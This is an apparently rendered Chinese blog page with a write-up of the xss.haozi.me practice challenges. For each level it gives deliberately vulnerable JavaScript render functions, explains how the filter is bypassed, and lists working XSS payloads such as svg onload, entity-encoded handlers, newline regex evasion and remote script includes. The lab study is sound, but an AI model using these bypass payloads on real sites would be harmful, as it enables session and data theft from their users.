@@ -1,0 +1,1034 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      xss练习题 | 美豆的博客
+    
+  </title>
+  <meta name="author" content="刘宸昕">
+  <meta name="keywords" content>
+  <meta name="description" content="倘若我问心有愧呢？">
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/Annie.css">
+  
+  <!-- jquery -->
+	<script src="/js/jquery.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+</head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="/" data-random-max="110" data-random-src="https://sariay.github.io/Random-img/">
+	<div class="mask">
+		<!-- Logo and navigation -->
+		<div class="h-header">
+			<div id="logo">
+				<a href="/">
+						
+						<img src="/img/logo.png" alt="Logo">
+					
+				</a>
+			</div>
+			
+			<div id="navigation-show">
+				<ul>
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home">主页</a>
+		</li>
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive">归档</a>
+		</li>
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories">分类</a>
+		</li>
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags">标签</a>
+		</li>
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about">关于</a>
+		</li>
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery">相册</a>
+		</li>
+	
+
+	
+</ul>
+			</div>				
+		</div>
+
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<p class="motto"></p>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down" aria-hidden="true"></i>
+			</a>
+
+			
+				<!-- 
+	This is only a demo, please go to "https://time.is" to set your city time! 
+-->
+<style type="text/css">
+	.header-date {
+		font-size: 1.6rem;
+		color: #fff;
+		position: absolute;
+		bottom: 5px;
+		right: 1rem;
+		writing-mode: tb-rl;
+	}	
+	
+	.header-date a {
+		border-bottom: none;
+	}
+
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			font-size: 1rem;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow"></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+			
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><h1>0.0%</h1></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			当前文章&nbsp;:&nbsp;《xss练习题》
+		
+	</p>
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home">主页</a>
+		</li>
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive">归档</a>
+		</li>
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories">分类</a>
+		</li>
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags">标签</a>
+		</li>
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about">关于</a>
+		</li>
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery">相册</a>
+		</li>
+	
+
+	
+</ul>
+	</div>
+	<div class="nav-footer">
+		<ul>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-github"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-weibo"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-pinterest"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-instagram"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<i class="fa fa-rss"></i>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+	<div class="article-title">
+		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
+		
+	<a href="/2019/09/22/xss练习题/" itemprop="url">
+		xss练习题
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			<i class="fa fa-calendar"></i>
+			
+
+
+	发布于
+
+	<a href="/2019/09/22/xss练习题/" itemprop="url">
+		<time datetime="2019-09-22T09:46:54.000Z" itemprop="datePublished">
+	  		2019-09-22
+	  </time>
+	</a>
+	&nbsp;
+
+
+
+
+
+			
+
+
+
+
+	更新于
+
+	<a href="/2019/09/22/xss练习题/" itemprop="url">
+		<time datetime="2019-09-22T09:46:54.000Z" itemprop="dateUpdated">
+	  		2019-09-22
+	  </time>
+	</a> 
+
+
+
+		</span>
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		<a href="/tags/xss/" class=" ">
+			xss
+		</a>
+	
+		
+		</span>
+		
+		
+
+
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<p><a href="https://xss.haozi.me/#/0x04" target="_blank" rel="noopener">https://xss.haozi.me/#/0x04</a> 习题答案解析：</p>
+<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h5 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>闭合<textarea>标签后输入script标签即可</textarea></p>
+<h5 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt; &lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>闭合用”和&gt;闭合input标签即可</p>
+<h5 id="payload：-2"><a href="#payload：-2" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h5 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目中过滤了圆括号，可以用反引号来代替。此外，<strong>在js中，反引号可以代替圆括号，还可以代替单双引号。</strong></p>
+<h5 id="payload1："><a href="#payload1：" class="headerlink" title="payload1："></a>payload1：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>也可以可以使用throw来绕过</p>
+<h5 id="payload2："><a href="#payload2：" class="headerlink" title="payload2："></a>payload2：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这一写法也可以用于其他题中，<br>例如0x00：&lt;svg/onload = alert(1);&gt;<br>0x01： &lt;svg/onload = alert(1);&gt;</p>
+</blockquote>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h5 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &apos;&apos;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题将圆括号和反引号都过滤了，也就是我们不能运用模板字符串了。我们想到，我们是否可以使用unicode 编码，来代替圆括号。这种思路没错，但是我们要遇到一个问题就是unicode编码怎么才会被转码实现了，如果只是正常的html编码，unicode编码是不会有任何用的。这里我们可以在了解一下 <svg>这个标签，这是一个外部标签，可以显示文字，字符及其他数据。 而<svg> 有一个 很重要的特性，便是它可以和xml一样将unicode编码转码进行执行，也就是我们可以通过这个标签执行 unicode编码，关于这个标签的具体介绍，我们可以查看下面这篇资料：<br/><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></svg></svg></p>
+<h5 id="payload1：-1"><a href="#payload1：-1" class="headerlink" title="payload1："></a>payload1：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>也可以用上一题提到的方法</p>
+<h5 id="payload2：-1"><a href="#payload2：-1" class="headerlink" title="payload2："></a>payload2：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><h5 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, &apos;😂&apos;)</span><br><span class="line">  return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&lt;！–可以用 –&gt;和–!&gt;两种方式闭合</p>
+<h5 id="payload：-3"><a href="#payload：-3" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><h5 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;)</span><br><span class="line">  return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题过滤了auto字符串 或 on开头=为结尾的字符串或者 &gt; 。</p>
+<p>所以，这里我们想直接 注入<script> </script>是不成功的，因为，我们的 &gt;会被过滤掉。</p>
+<p>这里，我们看到在input标签注入，我么就可以使用onmousemove这个属性，这个属性是当鼠标移到input这个输入框时，就会被执行的属性。 我们可以注入： οnmοusemοve=alert(1)</p>
+<p>但是，我们这里还有一个问题，就是 onmousemove 这个注入，是以on开头且中间有=，所以我们最终的输入会被正则过滤如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=1 _alert(1) type=&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>onmosemove=  这段字符串会被过滤，所以这里我们需要想一些办法。</p>
+<p>我们再来仔细查看上面的正则表达式: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on.*=</span><br></pre></td></tr></table></figure>
+<p>这个过滤，中间有 小数点：<br><img src="https://note.youdao.com/favicon.ico" alt="1"><br>那我们就知道，它不匹配换行符，所以如果我们在  onmousemove = alert(1)之间使用换行符，那么这个正则表达式就会匹配无法成功，于是可以成功绕过</p>
+<h5 id="payload：-4"><a href="#payload：-4" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><h5 id="题目：-7"><a href="#题目：-7" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, &apos;&apos;)</span><br><span class="line">  return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题主要是对  &lt;  和  &gt;进行了过滤，也就是我们不能同时输入  &lt;  和  &gt;。</p>
+<p>所以，这里我们可以运用 浏览器的容错性，当我们少输入一个  &gt;时，浏览器仍然会解释执行我们输入的标签语言。</p>
+<p>所以我们只需要考虑输入一个单标签执行语句。</p>
+<h5 id="payload：-5"><a href="#payload：-5" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload =&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><h5 id="题目：-8"><a href="#题目：-8" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;)</span><br><span class="line">  return `</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题过滤了标签，可以采用空格或者换行的方法进行绕过。</p>
+<h5 id="payload：-6"><a href="#payload：-6" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;</span><br><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><h5 id="题目：-9"><a href="#题目：-9" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  let domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  return &apos;Invalid URL&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>test(str)函数是判断 str字符串中，是否含有与a匹配的文本，有则返回 true，否则返回 false。</strong></p>
+<h5 id="payload：-7"><a href="#payload：-7" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><h5 id="题目：-10"><a href="#题目：-10" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &apos;&amp;amp;&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;&amp;#39;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;&amp;quot;&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;&amp;lt;&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;&amp;gt;&apos;)</span><br><span class="line">            .replace(/\//g, &apos;&amp;#x2f&apos;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="line">  &#125;</span><br><span class="line">  return &apos;Invalid URL&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="payload：-8"><a href="#payload：-8" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>
+<p>不明白这个是为什么</p>
+<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><h5 id="题目：-11"><a href="#题目：-11" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于HTML不区分大小写，Javascript严格区分大小写，所以将js的代码html实体编码绕过。也可以引入外部链接来解决。</p>
+<h5 id="payload：-9"><a href="#payload：-9" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><h5 id="题目：-12"><a href="#题目：-12" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/script/ig, &apos;&apos;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为这道题检查并替换掉了script，所以还可以用上一题的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>也可以双写script绕过</p>
+<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><h5 id="题目：-13"><a href="#题目：-13" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;)</span><br><span class="line">  return `</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">          // alert(&apos;$&#123;input&#125;&apos;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里过滤掉了&lt; / “ ‘ ，而且input在注释符//后，因为//是单行注释，所以可以利用换行来逃逸，后面的’)可以用–&gt;注释。（可以不跟&lt; !– 一起使用emm）</p>
+<h5 id="payload：-10"><a href="#payload：-10" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">)</span><br><span class="line">alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><h5 id="题目：-14"><a href="#题目：-14" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务器将&lt;+第一个字母转换成了&lt;_+大写字母，看似无解，但是经过长时间的搜集，发现了一个ſ字符，这个叫做“长S”。转换后正好为s</p>
+<h5 id="payload：-11"><a href="#payload：-11" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><h5 id="题目：-15"><a href="#题目：-15" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &apos;&amp;amp;&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;&amp;#39;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;&amp;quot;&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;&amp;lt;&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;&amp;gt;&apos;)</span><br><span class="line">            .replace(/\//g, &apos;&amp;#x2f;&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  return `&lt;img src onerror=&quot;console.error(&apos;$&#123;escapeHtml(input)&#125;&apos;)&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先闭合括号才能操作,再注释掉后面的括号</p>
+<p>因为这是在onerror属性里面，所以，实体编码也能解析</p>
+<h5 id="payload：-12"><a href="#payload：-12" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;);alert(&apos;1 或 &apos;);alert(1)// 或 &apos;);alert(1) (&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="0x010"><a href="#0x010" class="headerlink" title="0x010"></a>0x010</h3><h5 id="题目：-16"><a href="#题目：-16" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.data = $&#123;input&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>无过滤,在<script>中直接执行.</p>
+<h5 id="payload：-13"><a href="#payload：-13" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure>
